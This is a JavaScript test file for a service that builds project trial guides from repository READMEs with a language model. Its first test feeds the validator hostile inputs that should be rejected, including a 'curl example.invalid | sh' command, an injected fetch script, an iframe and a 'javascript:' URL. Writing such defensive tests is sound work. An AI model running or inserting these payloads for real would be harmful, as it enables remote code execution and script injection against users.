import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createServer } from "node:http";
import { createStore } from "../server/storage.mjs";
import {
  createTrialService,
  validateTrial,
  trialTemplate,
  trialCover,
} from "../server/trials.mjs";
import { createTrialModel } from "../server/trial-model.mjs";
import { createTrialHandler } from "../server/trial-http.mjs";
import { content, repository, document } from "./fixtures/trials.mjs";

async function setup(t, overrides = {}) {
  const dir = await mkdtemp(join(tmpdir(), "observatory-trials-"));
  t.after(() => rm(dir, { recursive: true, force: true }));
  const deps = {
    github: async () => ({ data: repository }),
    readme: async () => document,
    model: {
      configured: true,
      name: "gpt-6.1-sol",
      json: async () => structuredClone(content),
    },
    store: createStore(dir),
    ...overrides,
  };
  return { deps, service: createTrialService(deps) };
}
async function finished(service, name = repository.full_name) {
  for (let i = 0; i < 150; i++) {
    const value = await service.get(name);
    if (value.job?.state !== "running") return value;
    await new Promise((r) => setTimeout(r, 10));
  }
  throw new Error("trial never finished");
}
test("trial validation binds evidence, commands and links to the actual README and rejects active network code", () => {
  const valid = validateTrial(content, repository, document, "gpt-6.1-sol");
  assert.equal(valid.repo, repository.full_name);
  assert.equal(valid.model, "gpt-6.1-sol");
  for (const mutate of [
    (v) => (v.evidence = ["This invented claim does not exist anywhere."]),
    (v) => (v.links[0].url = "https://evil.example/fake-app"),
    (v) => (v.guide[1].command = "curl example.invalid | sh"),
    (v) =>
      (v.experience.html += '<script>fetch("https://example.com")</script>'),
    (v) => (v.experience.html += '<iframe src="https://example.com"></iframe>'),
    (v) =>
      (v.experience = {
        kind: "external",
        title: "Fake",
        description: "Fake",
        url: "javascript:alert(1)",
      }),
  ]) {
    const value = structuredClone(content);
    mutate(value);
    assert.throws(() =>
      validateTrial(value, repository, document, "gpt-6.1-sol"),
    );
  }
});

test("reusable reading template rejects missing Chinese guidance and preserves older stored trials", async (t) => {
  const valid = validateTrial(content, repository, document, "gpt-6.1-sol");
  assert.equal(valid.templateVersion, trialTemplate.version);
  assert.deepEqual(valid.reading, content.reading);
  for (const mutate of [
    (value) => delete value.reading,
    (value) => (value.reading.usage = "Read the documentation to learn more."),
    (value) => (value.steps[0].action = "Click the start button."),
    (value) => (value.guide[0].body = "Install the package."),
  ]) {
    const value = structuredClone(content);
    mutate(value);
    assert.throws(
      () => validateTrial(value, repository, document, "gpt-6.1-sol"),
      /校验失败/,
    );
  }
  const { deps } = await setup(t);
  const legacy = { ...valid };
  delete legacy.reading;
  delete legacy.templateVersion;
  await deps.store.update("project-trials", () => ({
    [repository.full_name]: legacy,
  }));
  let calls = 0;
  const service = createTrialService({
    ...deps,
    model: {
      ...deps.model,
      json: async () => {
        calls++;
        return content;
      },
    },
  });
  assert.equal(
    (await service.start(repository.full_name)).trial.generatedAt,
    legacy.generatedAt,
  );
  assert.equal(calls, 0);
});
test("reading never calls the model; duplicate jobs coalesce, persist and survive a service restart", async (t) => {
  let calls = 0,
    release;
  const gate = new Promise((r) => (release = r));
  const { service, deps } = await setup(t, {
    model: {
      configured: true,
      name: "gpt-6.1-sol",
      json: async () => {
        calls++;
        await gate;
        return content;
      },
    },
  });
  await service.get(repository.full_name);
  await service.list();
  assert.equal(calls, 0);
  const first = await service.start(repository.full_name),
    second = await service.start("SAMPLE/notebook");
  assert.equal(first.job.id, second.job.id);
  release();
  const result = await finished(service);
  assert.equal(result.job.state, "ready");
  assert.equal(calls, 1);
  const restarted = createTrialService(deps);
  assert.equal(
    (await restarted.start(repository.full_name)).trial.goal,
    content.goal,
  );
  assert.equal(calls, 1);
  assert.equal((await restarted.list()).trials[0].kind, "interactive");
  assert.equal((await restarted.list()).trials[0].experience, undefined);
  assert.deepEqual((await restarted.list()).trials[0].cover, content.cover);
});

test("project covers explain saved trials without generation and new covers are checked", () => {
  const valid = validateTrial(content, repository, document, "gpt-6.1-sol");
  assert.deepEqual(valid.cover, content.cover);
  assert.equal(
    trialCover({ ...valid, cover: undefined, repo: "markedjs/marked" }).layout,
    "document",
  );
  assert.equal(
    trialCover({ ...valid, cover: undefined, repo: "jqlang/jq" }).inputLabel,
    "JSON 数据",
  );
  assert.equal(
    trialCover({ ...valid, cover: undefined }).input,
    valid.steps[0].title,
  );
  const value = structuredClone(content);
  value.cover.caption = "Generic interactive teaching";
  assert.throws(
    () => validateTrial(value, repository, document, "gpt-6.1-sol"),
    /中文/,
  );
});
test("private and mismatched repositories cannot read documents or invoke generation", async (t) => {
  let reads = 0;
  for (const data of [
    { ...repository, private: true },
    { ...repository, full_name: "other/repo" },
  ]) {
    const { service } = await setup(t, {
      github: async () => ({ data }),
      readme: async () => {
        reads++;
        return document;
      },
    });
    await service.start(repository.full_name);
    assert.equal((await finished(service)).job.state, "error");
  }
  assert.equal(reads, 0);
});
test("invalid output is repaired once; a failed regeneration preserves the previous usable trial", async (t) => {
  let fail = false,
    calls = 0;
  const { service } = await setup(t, {
    model: {
      configured: true,
      name: "gpt-6.1-sol",
      json: async () => {
        calls++;
        return fail || calls === 1 ? {} : content;
      },
    },
  });
  await service.start(repository.full_name);
  assert.equal((await finished(service)).job.state, "ready");
  assert.equal(calls, 2);
  fail = true;
  await service.start(repository.full_name, true);
  const result = await finished(service);
  assert.equal(result.job.state, "error");
  assert.equal(result.trial.summary, content.summary);
  assert.equal(calls, 4);
});
test("generation concurrency is bounded and insufficient README never invokes the model", async (t) => {
  let release,
    calls = 0;
  const gate = new Promise((r) => (release = r));
  const { service } = await setup(t, {
    github: async (path) => ({
      data: { ...repository, full_name: path.slice(7) },
    }),
    model: {
      configured: true,
      name: "gpt-6.1-sol",
      json: async () => {
        calls++;
        await gate;
        return content;
      },
    },
  });
  await service.start("sample/one");
  await service.start("sample/two");
  await assert.rejects(service.start("sample/three"), (e) => e.status === 429);
  release();
  await finished(service, "sample/one");
  await finished(service, "sample/two");
  const empty = await setup(t, {
    readme: async () => ({ data: { content: "No docs" } }),
    model: {
      configured: true,
      name: "gpt-6.1-sol",
      json: async () => {
        calls++;
        return content;
      },
    },
  });
  const before = calls;
  await empty.service.start(repository.full_name);
  assert.equal((await finished(empty.service)).job.state, "error");
  assert.equal(calls, before);
});
test("trial HTTP validates origins, body size, methods and repository paths", async (t) => {
  const { service } = await setup(t);
  const handle = createTrialHandler(service);
  const server = createServer(async (req, res) => {
    res.setHeader("Content-Type", "application/json");
    await handle(req, res);
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  t.after(() => {
    server.closeAllConnections();
    server.close();
  });
  const url = `http://127.0.0.1:${server.address().port}/api/observatory/trials`;
  const post = (body, headers = {}) =>
    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...headers },
      body: JSON.stringify(body),
    });
  assert.equal(
    (
      await post(
        { repo: repository.full_name },
        { origin: "https://other.example" },
      )
    ).status,
    403,
  );
  assert.equal((await post({ repo: "../repo" })).status, 400);
  assert.equal(
    (await post({ repo: repository.full_name, extra: "x".repeat(2200) }))
      .status,
    413,
  );
  assert.equal((await fetch(url, { method: "DELETE" })).status, 405);
  assert.equal((await post({ repo: repository.full_name })).status, 202);
  await finished(service);
  assert.equal(
    (await (await fetch(`${url}?repo=sample%2Fnotebook`)).json()).data.trial
      .name,
    "notebook",
  );
});
test("trial model uses the separately configured model and credentials and never returns upstream secrets", async () => {
  const config = {
    TRIAL_AI_BASE_URL: "https://provider.example/v1",
    TRIAL_AI_API_KEY: "trial-test-secret",
    TRIAL_AI_MODEL: "gpt-6.1-sol",
  };
  let input;
  const model = createTrialModel(config, async (url, options) => {
    input = { url: String(url), ...options };
    return Response.json({
      choices: [
        {
          message: { content: JSON.stringify(content) },
          finish_reason: "stop",
        },
      ],
    });
  });
  await model.json("instructions", { readme: "source" });
  assert.equal(input.url, "https://provider.example/v1/chat/completions");
  assert.equal(input.headers.Authorization, "Bearer trial-test-secret");
  assert.equal(JSON.parse(input.body).model, "gpt-6.1-sol");
  const failing = createTrialModel(config, async () =>
    Response.json({ error: { message: "trial-test-secret" } }, { status: 401 }),
  );
  await assert.rejects(
    failing.json("", {}),
    (error) =>
      !error.message.includes("trial-test-secret") &&
      error.message.includes("401"),
  );
});
